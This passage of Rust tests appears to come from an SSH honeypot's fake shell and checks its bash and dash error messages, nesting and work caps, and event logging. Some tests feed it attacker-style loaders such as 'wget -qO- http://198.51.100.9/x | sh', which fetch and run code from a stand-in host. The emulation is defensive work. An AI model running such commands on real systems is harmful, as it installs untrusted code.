            "-bash: syntax error near unexpected token `)'\n"
        );
    }

    /// Each reply is dash 0.5.11's for the same `sh -c` text, run in the jammy reference
    /// container (`tests/fixtures/sessions/ubuntu-dash-syntax-errors.session` replays more).
    #[test]
    fn dash_says_word_for_a_plain_word_and_names_the_token_it_waited_for() {
        let cases: [(&str, &str); 36] = [
            ("(echo a) extra", "word unexpected"),
            ("(echo a) then", "\"then\" unexpected"),
            ("echo a; fi", "\"fi\" unexpected"),
            (
                "if true; then echo a",
                "end of file unexpected (expecting \"fi\")",
            ),
            (
                "if true; echo a; fi",
                "\"fi\" unexpected (expecting \"then\")",
            ),
            ("if; then echo; fi", "\";\" unexpected"),
            (
                "while true; do echo a",
                "end of file unexpected (expecting \"done\")",
            ),
            (
                "while true; echo a; done",
                "\"done\" unexpected (expecting \"do\")",
            ),
            (
                "for i in 1 2; echo $i; done",
                "word unexpected (expecting \"do\")",
            ),
            ("for; do echo; done", "Bad for loop variable"),
            ("for 1 in a; do echo; done", "Bad for loop variable"),
            ("for i in a b", "end of file unexpected"),
            ("for i", "end of file unexpected (expecting \"do\")"),
            (
                "case x in a) echo a",
                "end of file unexpected (expecting \";;\")",
            ),
            ("case x a) echo; esac", "word unexpected (expecting \"in\")"),
            (
                "case x in a echo; esac",
                "word unexpected (expecting \")\")",
            ),
            ("case", "end of file unexpected (expecting word)"),
            (
                "case x in |a) echo;; esac",
                "word unexpected (expecting \")\")",
            ),
            ("{ echo a", "end of file unexpected (expecting \"}\")"),
            ("{ echo a; )", "\")\" unexpected (expecting \"}\")"),
            ("( echo a }", "end of file unexpected (expecting \")\")"),
            ("echo a |", "end of file unexpected"),
            ("echo >", "end of file unexpected"),
            ("echo > > f", "redirection unexpected"),
            ("echo a <<<b", "redirection unexpected"),
            ("echo $(echo a", "end of file unexpected (expecting \")\")"),
            (
                "echo $(if true; then echo a)",
                "\")\" unexpected (expecting \"fi\")",
            ),
            ("echo $(fi)", "\"fi\" unexpected (expecting \")\")"),
            ("echo `echo a", "EOF in backquote substitution"),
            ("echo ${a", "Missing '}'"),
            ("echo $((1+", "Missing '))'"),
            ("echo (a)", "word unexpected (expecting \")\")"),
            ("echo a (b)", "\"(\" unexpected"),
            ("! ! echo x", "\"!\" unexpected"),
            ("in", "\"in\" unexpected"),
            ("x=(1 2)", "\"(\" unexpected"),
        ];
        for (script, message) in cases {
            assert_eq!(
                once(&format!("sh -c '{script}'")),
                format!("sh: 1: Syntax error: {message}\n"),
                "{script}"
            );
        }
    }

    #[test]
    fn dash_refuses_a_bad_fd_and_a_bad_substitution_when_it_runs_them() {
        for (script, reply, status) in [
            (
                "echo >&a; echo after",
                "sh: 1: Syntax error: Bad fd number\n",
                2,
            ),
            ("echo ${}; echo after", "sh: 1: Bad substitution\n", 2),
            ("echo ${a:1}; echo after", "sh: 1: Bad substitution\n", 2),
            ("echo ${a/x/y}", "sh: 1: Bad substitution\n", 2),
            (
                "echo a; echo ${}; echo after",
                "a\nsh: 1: Bad substitution\n",
                2,
            ),
            (
                "echo $((1/0)); echo after",
                "sh: 1: arithmetic expression: division by zero: \"1/0\"\n",
                2,
            ),
        ] {
            let mut sh = shell();
            assert_eq!(
                run(&mut sh, &format!("sh -c '{script}'")),
                reply,
                "{script}"
            );
            assert_eq!(sh.last_status(), status, "{script}");
        }
    }

    #[test]
    fn dash_reads_the_constructs_it_has_no_syntax_for_as_plain_text() {
        // dash has no brace expansion, `$'..'`, `[[`, here-strings or `|&`; a descriptor is one digit.
        assert_eq!(once("sh -c 'echo {a,b}'"), "{a,b}\n");
        assert_eq!(once("sh -c \"echo \\$'a'\""), "$a\n");
        assert_eq!(once("sh -c 'echo 12>f; cat f'"), "12\n");
        assert_eq!(once("sh -c '(( 1+1 ))'"), "sh: 1: 1+1: not found\n");
        assert_eq!(
            once("sh -c 'echo a |& b'"),
            "sh: 1: Syntax error: \"&\" unexpected\n"
        );
    }

    #[test]
    fn dash_and_the_exec_shell_word_the_same_error_their_own_way() {
        let mut sh = shell();
        run(&mut sh, "sh");
        assert_eq!(run(&mut sh, ")"), "sh: 1: Syntax error: \")\" unexpected\n");
        assert_eq!(
            run(&mut sh, "echo >"),
            "sh: 2: Syntax error: newline unexpected\n"
        );
        assert_eq!(
            run(&mut sh, "fi"),
            "sh: 3: Syntax error: \"fi\" unexpected\n"
        );

        let mut exec = FakeShell::exec(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "ssh".to_string(),
                session_id: None,
            },
        );
        assert_eq!(
            run(&mut exec, ")"),
            "bash: -c: line 1: syntax error near unexpected token `)'\nbash: -c: line 1: `)'\n"
        );
    }

    #[test]
    fn an_incomplete_construct_in_a_script_is_an_end_of_file_error() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "bash -c 'if true; then echo x'"),
            "bash: -c: line 2: syntax error: unexpected end of file\n"
        );
        assert_eq!(
            run(&mut sh, "sh -c 'if true; then echo x'"),
            "sh: 1: Syntax error: end of file unexpected (expecting \"fi\")\n"
        );
        run(&mut sh, "sh");
        assert_eq!(
            run(&mut sh, "sh -c 'echo \"open'"),
            "sh: 1: Syntax error: Unterminated quoted string\n"
        );
    }

    #[test]
    fn a_script_runs_its_lines_up_to_the_first_syntax_error() {
        let mut sh = shell();
        run(&mut sh, "cat > /tmp/s <<EOF\necho one\n)\necho two\nEOF");
        let (out, _) = sh.handle_input("sh /tmp/s");
        // dash names the script as it was typed: `/tmp/s: 2: Syntax error: ...`.
        assert_eq!(out, "one\n/tmp/s: 2: Syntax error: \")\" unexpected\n");
        assert_eq!(out.status, 2);
    }

    /// The prefix of a dash diagnostic is `$0`: the script as typed (relative, with a directory,
    /// absolute), the operand after `-c CMD`, and `sh` where dash has no name. Each reply was
    /// produced by Ubuntu 22.04's dash.
    #[test]
    fn a_dash_script_names_itself_as_it_was_typed() {
        let mut sh = shell();
        run(&mut sh, "mkdir -p /tmp/d/sub; cd /tmp/d");
        run(&mut sh, "echo ./nosuch > .s; echo ./nosuch > sub/x.sh");
        run(
            &mut sh,
            "echo 'sh -c ./nosuch3' > outer; echo ./nosuch4 >> outer",
        );
        for (line, want) in [
            ("sh .s", ".s: 1: ./nosuch: not found\n"),
            ("sh ./.s", "./.s: 1: ./nosuch: not found\n"),
            ("sh /tmp/d/.s", "/tmp/d/.s: 1: ./nosuch: not found\n"),
            ("sh sub/x.sh", "sub/x.sh: 1: ./nosuch: not found\n"),
            ("sh -c ./nosuch", "sh: 1: ./nosuch: not found\n"),
            ("sh -c ./nosuch myname", "myname: 1: ./nosuch: not found\n"),
            // A script that starts another keeps each its own name; `sh -c` inside has none.
            (
                "sh outer",
                "sh: 1: ./nosuch3: not found\nouter: 2: ./nosuch4: not found\n",
            ),
        ] {
            assert_eq!(run(&mut sh, line), want, "{line}");
        }
        // Standard input is nameless, and so is a script piped in.
        assert_eq!(
            run(&mut sh, "echo ./nosuch | sh"),
            "sh: 1: ./nosuch: not found\n"
        );
    }
}

mod command_not_found {
    use super::*;

    /// The interactive login bash on this box has Ubuntu's command-not-found handler, whose
    /// answer for a name it has no suggestion for is the bare `NAME: command not found`. A bash
    /// that runs a script has no handler: it names `$0` and the line (replies from the reference
    /// container's bash 5.1.16 and dash 0.5.11, see `ubuntu-bash-command-not-found.session`).
    #[test]
    fn only_the_interactive_bash_has_the_handler_and_a_script_names_its_line() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "f"), "f: command not found\n");
        assert_eq!(run(&mut sh, "(f)"), "f: command not found\n");
        assert_eq!(
            run(&mut sh, "foo/bar"),
            "-bash: foo/bar: No such file or directory\n"
        );
        assert_eq!(
            run(&mut sh, "bash -c f"),
            "bash: line 1: f: command not found\n"
        );
        assert_eq!(
            run(&mut sh, "bash -c 'f' name arg"),
            "name: line 1: f: command not found\n"
        );
        assert_eq!(
            run(&mut sh, "bash -c 'cd /nonexistent'"),
            "bash: line 1: cd: /nonexistent: No such file or directory\n"
        );
        assert_eq!(
            run(&mut sh, "bash -c 'g() { f; }; g'"),
            "environment: line 1: f: command not found\n"
        );
        assert_eq!(run(&mut sh, "sh -c f"), "sh: 1: f: not found\n");
        assert_eq!(
            run(&mut sh, "sh -c 'f' name arg"),
            "name: 1: f: not found\n"
        );
    }

    #[test]
    fn a_script_names_itself_as_typed_and_the_line_of_the_command() {
        let mut sh = shell();
        run(&mut sh, "printf 'echo a\\nf\\n' > /tmp/y.sh");
        assert_eq!(
            run(&mut sh, "bash /tmp/y.sh"),
            "a\n/tmp/y.sh: line 2: f: command not found\n"
        );
        run(&mut sh, "cd /tmp");
        assert_eq!(
            run(&mut sh, "bash y.sh"),
            "a\ny.sh: line 2: f: command not found\n"
        );
        assert_eq!(
            run(&mut sh, "cat y.sh | bash"),
            "a\nbash: line 2: f: command not found\n"
        );
        assert_eq!(run(&mut sh, "echo $?"), "127\n");
    }
}

mod continuation_lines {
    use super::*;

    #[test]
    fn an_open_quote_waits_for_the_rest_and_the_prompt_is_ps2() {
        let mut sh = shell();
        let normal = sh.prompt();
        let (out, events) = sh.handle_input("echo \"a");
        assert_eq!(
            (out.is_empty(), events.len()),
            (true, 1),
            "one event per line, no output"
        );
        assert_eq!(sh.prompt(), "> ");
        assert_eq!(run(&mut sh, "b\""), "a\nb\n");
        assert_eq!(sh.prompt(), normal);
    }

    #[test]
    fn compound_commands_and_operators_and_backslashes_continue() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "if true"), "");
        assert_eq!(run(&mut sh, "then echo x"), "");
        assert_eq!(run(&mut sh, "fi"), "x\n");
        assert_eq!(run(&mut sh, "true &&"), "");
        assert_eq!(run(&mut sh, "echo y"), "y\n");
        assert_eq!(run(&mut sh, "echo a\\"), "");
        assert_eq!(run(&mut sh, "b"), "ab\n");
        assert_eq!(run(&mut sh, "for i in 1 2"), "");
        assert_eq!(run(&mut sh, "do echo $i"), "");
        assert_eq!(run(&mut sh, "done"), "1\n2\n");
        assert_eq!(run(&mut sh, "echo $(echo z"), "");
        assert_eq!(run(&mut sh, ")"), "z\n");
        assert_eq!(run(&mut sh, "{ echo a;"), "");
        assert_eq!(run(&mut sh, "echo b; }"), "a\nb\n");
    }

    #[test]
    fn an_exec_request_is_one_complete_string_with_no_continuation() {
        let mut exec = FakeShell::exec(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "ssh".to_string(),
                session_id: None,
            },
        );
        assert_eq!(run(&mut exec, "if true\nthen echo x\nfi"), "x\n");
        assert_eq!(run(&mut exec, "echo a; echo b"), "a\nb\n");
        // No next line will finish an open quote: the exec shell reports it at once.
        assert_eq!(
            run(&mut exec, "echo \"open"),
            "bash: -c: line 1: unexpected EOF while looking for matching `\"'\n\
             bash: -c: line 2: syntax error: unexpected end of file\n"
        );
        assert_eq!(exec.prompt(), "");
    }

    #[test]
    fn a_blank_line_inside_an_open_construct_belongs_to_it_and_is_no_command() {
        let mut sh = shell();
        run(&mut sh, "cat <<EOF");
        let (out, events) = sh.handle_input("");
        assert_eq!((out.is_empty(), events.len()), (true, 0));
        run(&mut sh, "x");
        assert_eq!(run(&mut sh, "EOF"), "\nx\n");
    }

    #[test]
    fn the_pending_buffer_is_bounded_and_discarded_past_its_limit() {
        let mut sh = shell();
        run(&mut sh, "echo \"start");
        for _ in 0..70 {
            run(&mut sh, "more");
        }
        // Past 64 lines the pending text is dropped and the shell is usable again.
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
        assert_eq!(run(&mut sh, "echo ok"), "ok\n");

        run(&mut sh, "echo \"start");
        let big = "x".repeat(8_000);
        for _ in 0..12 {
            run(&mut sh, &big);
        }
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
        assert_eq!(run(&mut sh, "echo ok"), "ok\n");
    }

    #[test]
    fn dash_counts_every_physical_line_of_a_continued_command() {
        let mut sh = shell();
        run(&mut sh, "sh");
        run(&mut sh, "if true; then");
        run(&mut sh, "missing_one");
        assert_eq!(run(&mut sh, "fi"), "sh: 2: missing_one: not found\n");
        assert_eq!(
            run(&mut sh, "missing_two"),
            "sh: 4: missing_two: not found\n"
        );
    }
}

mod shell_levels {
    use super::*;

    #[test]
    fn a_nested_shell_has_its_own_working_directory_and_variables() {
        let mut sh = shell();
        run(&mut sh, "x=outer; export E=exported");
        run(&mut sh, "sh");
        assert_eq!(run(&mut sh, "echo [$x] [$E]"), "[] [exported]\n");
        run(&mut sh, "cd /tmp; y=inner");
        assert_eq!(sh.cwd(), "/tmp");
        assert_eq!(sh.prompt(), "# ");
        run(&mut sh, "exit");
        assert_eq!(sh.cwd(), "/root");
        assert_eq!(run(&mut sh, "echo [$x] [$y]"), "[outer] []\n");
    }

    #[test]
    fn exit_from_a_nested_shell_restores_the_outer_prompt_directory() {
        // pty README finding 7: the sweep runs in nested shells and the outer prompt is `~`.
        let mut sh = shell();
        run(&mut sh, "sh");
        run(&mut sh, "cd /home");
        run(&mut sh, "exit");
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
    }

    #[test]
    fn sh_c_takes_dollar_zero_and_positional_arguments_and_the_environment() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "sh -c 'echo $0 $1 $#' name a b"), "name a 2\n");
        run(&mut sh, "export K=v; U=u");
        assert_eq!(run(&mut sh, "sh -c 'echo [$K] [$U]'"), "[v] []\n");
        assert_eq!(
            run(&mut sh, "T=tmp sh -c 'echo $T'; echo [$T]"),
            "tmp\n[]\n"
        );
        assert_eq!(run(&mut sh, "sh -c \"echo 'a b'\""), "a b\n");
        assert_eq!(run(&mut sh, "sh -c ''"), "");
    }

    #[test]
    fn sh_file_runs_the_file_in_a_shell_of_its_own() {
        let mut sh = shell();
        run(&mut sh, "echo id > /tmp/s");
        assert_eq!(
            run(&mut sh, "sh /tmp/s"),
            "uid=0(root) gid=0(root) groups=0(root)\n"
        );
        run(&mut sh, "echo 'echo [$0] [$1]' > /tmp/t");
        assert_eq!(run(&mut sh, "sh /tmp/t one"), "[/tmp/t] [one]\n");
        run(&mut sh, "echo 'cd /tmp; x=1' > /tmp/u");
        assert_eq!(run(&mut sh, "sh /tmp/u; pwd; echo [$x]"), "/root\n[]\n");
        assert_eq!(
            run(&mut sh, "echo > /tmp/blank; sh /tmp/blank; echo $?"),
            "0\n"
        );
        assert_eq!(
            run(&mut sh, "sh /tmp/nope_q"),
            "sh: 0: cannot open /tmp/nope_q: No such file\n"
        );
    }

    #[test]
    fn a_script_piped_to_sh_runs_and_a_bare_sh_with_terminal_input_opens_a_level() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "echo id | sh"),
            "uid=0(root) gid=0(root) groups=0(root)\n"
        );
        assert_eq!(run(&mut sh, "echo 'echo a; echo b' | sh"), "a\nb\n");
        assert_eq!(
            run(&mut sh, "sh < /tmp/nope_q"),
            "-bash: /tmp/nope_q: No such file or directory\n"
        );
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
        run(&mut sh, "sh");
        assert_eq!(sh.prompt(), "# ");
    }

    #[test]
    fn a_loader_that_pipes_a_download_into_sh_gets_shells_errors_for_html() {
        // The body the fake fetch claims is HTML, which no shell accepts as a script.
        let mut sh = shell();
        let out = run(&mut sh, "wget -qO- http://198.51.100.9/x | sh");
        assert!(out.to_lowercase().contains("syntax error"), "{out}");
        assert!(
            out.contains("redirection unexpected"),
            "dash words a stray redirection so: {out}"
        );
    }

    #[test]
    fn source_and_eval_only_record_intent() {
        let mut sh = shell();
        run(&mut sh, "echo 'echo ran' > /tmp/src");
        assert_eq!(run(&mut sh, ". /tmp/src"), "");
        assert_eq!(run(&mut sh, "source /tmp/src"), "");
        assert_eq!(run(&mut sh, "eval 'echo ran'"), "");
        assert_eq!(
            run(&mut sh, "source /tmp/nope_q"),
            "-bash: source: /tmp/nope_q: file not found\n"
        );
    }

    #[test]
    fn the_shells_own_pid_resolves_under_proc() {
        let mut sh = shell();
        let pid = crate::persona::session_pid(None);
        assert_eq!(run(&mut sh, &format!("cat /proc/{pid}/cmdline")), "-bash\0");
        assert_eq!(
            run(&mut sh, &format!("cat /proc/{pid}/mounts")),
            run(&mut sh, "cat /proc/self/mounts")
        );
        // A pid outside the process table is no process (pid 1 is init, a row of it; 7 is no
        // kernel thread of the modeled kernel).
        assert!(run(&mut sh, "cat /proc/7/cmdline").contains("No such file"));
    }

    #[test]
    fn pids_are_deterministic_for_a_session_and_differ_between_sessions() {
        let a = crate::persona::session_pid(Some(7));
        assert_eq!(a, crate::persona::session_pid(Some(7)));
        assert_ne!(a, crate::persona::session_pid(Some(8)));
        assert!((1_000..29_000).contains(&a));
        assert_eq!(
            crate::persona::session_pid(None),
            crate::persona::session_pid(None)
        );
    }
}

mod builtins_that_act_on_the_shell {
    use super::*;

    #[test]
    fn export_and_unset_and_set_manage_variables_and_parameters() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "export A=1 B; echo [$A] [$B]"), "[1] []\n");
        assert!(run(&mut sh, "export").contains("declare -x A=\"1\"\n"));
        assert!(run(&mut sh, "export").contains("declare -x HOME=\"/root\"\n"));
        assert_eq!(run(&mut sh, "unset A; echo [$A]"), "[]\n");
        assert_eq!(
            run(
                &mut sh,
                "set -- x y; echo $#; set a b c; echo $#; set --; echo $#"
            ),
            "2\n3\n0\n"
        );
        assert_eq!(
            run(&mut sh, "set -e; set +x; set -o pipefail; echo ok"),
            "ok\n"
        );
        assert!(run(&mut sh, "set").contains("HOME=/root\n"));
        assert_eq!(
            run(&mut sh, "export 1x"),
            "-bash: export: `1x': not a valid identifier\n"
        );
    }

    #[test]
    fn shift_umask_and_cd_dash_report_and_fail_like_bash() {
        let mut sh = shell();
        run(&mut sh, "set -- a b");
        assert_eq!(
            run(&mut sh, "shift 5"),
            "-bash: shift: 5: shift count out of range\n"
        );
        assert_eq!(status_of(&mut sh, "shift 5"), 1);
        assert_eq!(run(&mut sh, "shift 2; echo $#"), "0\n");
        assert_eq!(run(&mut sh, "umask"), "0022\n");
        assert_eq!(run(&mut sh, "umask -S"), "u=rwx,g=rx,o=rx\n");
        assert_eq!(run(&mut sh, "umask 077; umask"), "0077\n");
        assert_eq!(
            run(&mut sh, "umask 999"),
            "-bash: umask: 999: octal number out of range\n"
        );
        assert_eq!(run(&mut sh, "cd -"), "-bash: cd: OLDPWD not set\n");
        run(&mut sh, "cd /tmp");
        assert_eq!(run(&mut sh, "cd -"), "/root\n");
        assert_eq!(sh.cwd(), "/root");
        assert_eq!(run(&mut sh, "cd; pwd"), "/root\n");
        assert_eq!(
            run(&mut sh, "exit 5x"),
            "-bash: exit: 5x: numeric argument required\nlogout\n"
        );
    }

    #[test]
    fn read_reads_a_line_splits_it_and_reports_end_of_input() {
        let mut sh = shell();
        run(&mut sh, "echo 'one two  three' > /tmp/r");
        assert_eq!(
            run(&mut sh, "read a b < /tmp/r; echo \"[$a] [$b]\""),
            "[one] [two  three]\n"
        );
        assert_eq!(
            run(&mut sh, "read only < /tmp/r; echo \"[$only]\""),
            "[one two  three]\n"
        );
        assert_eq!(
            run(&mut sh, "read < /tmp/r; echo \"[$REPLY]\""),
            "[one two  three]\n"
        );
        // Nothing to read from the terminal: end of input.
        assert_eq!(status_of(&mut sh, "read x"), 1);
        assert_eq!(status_of(&mut sh, "read x < /dev/null"), 1);
        // A last line with no newline is still read, with status 1.
        run(&mut sh, "echo -n tail > /tmp/nonl");
        assert_eq!(
            run(&mut sh, "read x < /tmp/nonl; echo $? [$x]"),
            "1 [tail]\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "echo 'a\\b' > /tmp/bs; read x < /tmp/bs; echo $x; read -r y < /tmp/bs; echo $y"
            ),
            "ab\na\\b\n"
        );
    }
}

mod caps {
    use super::*;
    use crate::budget::{BudgetLimits, ConnectionBudget};

    fn limited(edit: impl FnOnce(&mut BudgetLimits)) -> FakeShell {
        let mut limits = BudgetLimits::standard();
        edit(&mut limits);
        shell().with_budget(ConnectionBudget::new(limits))
    }

    #[test]
    fn an_endless_loop_stops_at_the_line_allowance_with_status_1_and_the_session_lives() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("while :; do :; done");
        assert_eq!(out.status, 1);
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
        let (out, _) =
            sh.handle_input("for i in 1 2 3; do echo x; done; while true; do echo y; done");
        assert_eq!(out.status, 1);
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
    }

    #[test]
    fn nesting_past_sixteen_is_refused_at_every_kind_of_entry() {
        let cases = [
            format!("{}:{}", "( ".repeat(20), " )".repeat(20)),
            format!("{}:{}", "{ ".repeat(20), "; }".repeat(20)),
            format!("{}:{}", "if :; then ".repeat(20), "; fi".repeat(20)),
            format!("echo {}x{}", "$(echo ".repeat(20), ")".repeat(20)),
            format!("echo {}x{}", "`echo ".repeat(20), "`".repeat(20)),
            "sh -c ".repeat(20) + "echo",
            "busybox ".repeat(20) + "echo",
        ];
        for line in cases {
            let mut sh = shell();
            let (out, _) = sh.handle_input(&line);
            let trace = sh.last_trace();
            assert!(
                trace.budget.max_depth_reached <= 16,
                "{line}: {}",
                trace.budget.max_depth_reached
            );
            assert!(
                out.status <= 1 || out.status == 127,
                "{line}: {}",
                out.status
            );
            assert_eq!(run(&mut sh, "echo alive"), "alive\n", "{line}");
        }
        let mut sh = shell();
        sh.handle_input(format!("{}echo x{}", "$(".repeat(20), ")".repeat(20)));
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
    }

    #[test]
    fn a_script_that_runs_itself_stops_at_exactly_sixteen_levels() {
        let mut sh = shell();
        run(&mut sh, "echo 'echo hit; sh /tmp/self' > /tmp/self");
        let (out, _) = sh.handle_input("sh /tmp/self");
        assert_eq!(out.to_string().matches("hit").count(), 16);
        assert_eq!(out.status, 1);
        assert_eq!(sh.last_trace().budget.max_depth_reached, 16);
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
        // The same through an applet and through `sh -c` reading the file.
        let (out, _) = sh.handle_input("busybox sh /tmp/self");
        assert_eq!(out.to_string().matches("hit").count(), 15);
    }

    #[test]
    fn a_word_that_doubles_itself_runs_out_of_allowance_not_memory() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("x=aaaaaaaa; while :; do x=\"$x$x\"; done");
        assert_eq!(out.status, 1);
        // The variables' own cap is reached first; the loop then runs the allowance out.
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
        let held = sh.state().get("x").map_or(0, str::len);
        assert!(held <= 196_608, "{held} bytes held");
    }

    #[test]
    fn variables_together_may_not_pass_the_content_allowance() {
        let mut sh = shell();
        let cap = usize::try_from(BudgetLimits::standard().owned_bytes).unwrap();
        for _ in 0..40 {
            sh.handle_input("x=\"$x$x\"aaaa");
        }
        let held: usize = sh
            .state()
            .vars
            .iter()
            .map(|(name, var)| name.len() + var.value.len())
            .sum();
        assert!(held <= cap, "{held} > {cap}");
        // A refused assignment reports failure and keeps the old value.
        assert_eq!(status_of(&mut sh, "x=\"$x$x\""), 1);
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
    }

    #[test]
    fn parsing_and_expansion_spend_the_same_allowance() {
        let mut sh = limited(|l| l.work_per_line = 200);
        let (out, _) = sh.handle_input(format!("echo {}", "a ".repeat(400)));
        assert_eq!(out.status, 1);
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));
        assert_eq!(run(&mut sh, "echo ok"), "ok\n");
    }

    #[test]
    fn a_line_far_over_the_allowance_never_runs_anything() {
        let mut sh = limited(|l| l.work_per_line = 100);
        let (out, _) = sh.handle_input(format!(">/tmp/x; echo {}", "y".repeat(5_000)));
        assert_eq!(out.status, 1);
        assert!(sh.handle_input("cat /tmp/x").0.contains("No such file"));
    }
}

mod events {
    use super::*;

    #[test]
    fn a_line_is_one_command_event_however_many_commands_it_holds() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("echo a; echo b | cat && ( id )").1.len(), 1);
        assert_eq!(
            sh.handle_input("for i in 1 2 3; do echo $i; done").1.len(),
            1
        );
        assert_eq!(sh.handle_input("").1.len(), 0);
        assert_eq!(sh.handle_input("   ").1.len(), 0);
    }

    #[test]
    fn download_events_still_come_from_the_raw_line() {
        let mut sh = shell();
        let (_, events) = sh.handle_input(
            "(wget http://198.51.100.9/a || curl -O http://198.51.100.9/a) > /tmp/w; sh /tmp/w",
        );
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(urls, vec!["http://198.51.100.9/a"]);
    }
}

/// Random programs built from the grammar's own vocabulary and driven through the whole shell,
/// near every cap. The properties are the ones the caps exist for: no panic, recursion never
/// deeper than the cap, the line's allowance honored (the line ends), a session that still
/// answers afterwards, and events that are only the two kinds a line may emit.
mod property {
    use super::*;
    use crate::budget::{BudgetLimits, ConnectionBudget};

    struct Rng(u64);

    impl Rng {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 << 13;
            self.0 ^= self.0 >> 7;
            self.0 ^= self.0 << 17;
            self.0
        }

        fn below(&mut self, n: usize) -> usize {
            usize::try_from(self.next() % u64::try_from(n).unwrap()).unwrap()
        }

        fn pick<'a>(&mut self, items: &'a [&'a str]) -> &'a str {
            items[self.below(items.len())]
        }
    }

    const WORDS: &[&str] = &[
        "echo",
        "cat",
        "id",
        "true",
        "false",
        ":",
        "cd",
        "/tmp",
        "/",
        "/etc",
        "x",
        "y",
        "$x",
        "${x:-d}",
        "$?",
        "$#",
        "$$",
        "$1",
        "$@",
        "\"$@\"",
        "$((1+1))",
        "$((x/0))",
        "$(",
        "`",
        ")",
        "(",
        "{",
        "}",
        "if",
        "then",
        "else",
        "elif",
        "fi",
        "for",
        "i",
        "in",
        "do",
        "done",
        "while",
        "until",
        "!",
        "&&",
        "||",
        "|",
        "&",
        ";",
        ";;",
        "\n",
        ">",
        "<",
        ">>",
        "2>&1",
        ">&2",
        "<<EOF",
        "EOF",
        "<<-E",
        "'",
        "\"",
        "\\",
        "$((",
        "))",
        "*",
        "?",
        "[",
        "]",
        "~",
        "#",
        "=",
        "a=b",
        "sh",
        "-c",
        "bash",
        "break",
        "continue",
        "exit",
        "read",
        "export",
        "shift",
        "set",
        "--",
        "case",
        "esac",
        "[[",
        "]]",
        "$'",
        "{a,b}",
        "${x##*/}",
        "<<<",
        "<(",
        "wget",
        "curl",
        "http://198.51.100.9/x",
        "-qO-",
        "busybox",
        "-e",
        "/dev/null",
        "/dev/zero",
        "/bin/busybox",
        "eval",
        ".",
        "source",
        "umask",
        "unset",
        "cp",
        "rm",
        "mkdir",
        "chmod",
        "+x",
        "ls",
        "pwd",
    ];

    fn program(rng: &mut Rng) -> String {
        let count = 1 + rng.below(40);
        let mut out = String::new();
        for _ in 0..count {
            out.push_str(rng.pick(WORDS));
            if rng.below(6) != 0 {
                out.push(' ');
            }
        }
        out
    }

    /// Deeply nested and looping shapes the flat vocabulary rarely builds.
    fn nested(rng: &mut Rng) -> String {
        let openers = [
            "( ",
            "{ ",
            "$(",
            "`",
            "if :; then ",
            "while :; do ",
            "for i in 1 2; do ",
            "sh -c '",
            "echo $((",
        ];
        let closers = [" )", "; }", ")", "`", "; fi", "; done", "; done", "'", "))"];
        let kind = rng.below(openers.len());
        let depth = 1 + rng.below(40);
        format!(
            "{}:{}",
            openers[kind].repeat(depth),
            closers[kind].repeat(depth)
        )
    }

    fn check(line: &str, limits: BudgetLimits) {
        let max_depth = limits.max_depth;
        let allowance = limits.work_per_line;
        let mut sh = shell().with_budget(ConnectionBudget::new(limits));
        let (out, events) = sh.handle_input(line);
        let trace = sh.last_trace();
        assert!(
            trace.budget.max_depth_reached <= max_depth,
            "depth {} past {max_depth}: {line:?}",
            trace.budget.max_depth_reached
        );
        // The line stops shortly after its allowance: what is charged past it is only the
        // checkpoints between the last charge and the next test, never an unbounded run.
        assert!(
            trace.budget.work_charged <= allowance.saturating_add(4 * crate::fakefs::READ_CAP),
            "charged {} past allowance {allowance}: {line:?}",
            trace.budget.work_charged
        );
        for event in &events {
            assert!(
                event.signal_type == sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC
                    || event.signal_type == sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD,
                "{line:?}"
            );
        }
        // No trace vocabulary reaches the reply.
        let text = out.to_string();
        for word in [
            "CommandTrace",
            "LineTrace",
            "HandlerId",
            "RunDecision",
            "SkippedByAnd",
        ] {
            assert!(!text.contains(word), "{word} leaked for {line:?}");
        }
        // The session still answers. A construct the program left open is closed first.
        for _ in 0..70 {
            if sh.prompt().starts_with('>') {
                sh.handle_input("EOF\n'\n\"\n)\n}\nfi\ndone\n`");
            } else {
                break;
            }
        }
        let (alive, _) = sh.handle_input("echo alive");
        assert!(
            alive.ends_with("alive\n")
                || alive.contains("not found")
                || sh.prompt().starts_with('>'),
            "no answer after {line:?}: {alive:?}"
        );
    }

    #[test]
    fn random_grammar_programs_never_break_the_caps() {
        let limits = |work: u64| BudgetLimits {
            work_per_line: work,
            ..BudgetLimits::standard()
        };
        let mut rng = Rng(0x9E37_79B9_7F4A_7C15);
        for round in 0..2_400 {
            let line = if round % 5 == 0 {
